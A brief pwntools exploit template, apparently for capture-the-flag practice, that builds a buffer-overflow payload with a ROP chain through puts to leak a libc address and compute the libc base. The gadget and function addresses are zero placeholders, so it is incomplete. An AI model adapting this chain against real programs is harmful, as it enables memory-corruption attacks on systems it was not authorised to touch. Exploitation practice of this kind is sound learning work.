from pwn import *

libc = ELF('libc.so.6')

junk = 'A' * 1337
pop_rdi = 0x0
puts_plt = 0x0 # objdump -D -z binary | grep puts
puts = 0x0
main = 0x0
puts_offset = libc.symbols['puts']

def leak_libc(p):
    p.recvuntil('$ ')
    exploit = junk + p64(pop_rdi) + p64(puts) + p64(puts_plt) + p64(main)
    p.sendline(exploit)
    puts_address = u64(p.recvline().strip() + '\x00\x00')
    return puts_address - puts_offset
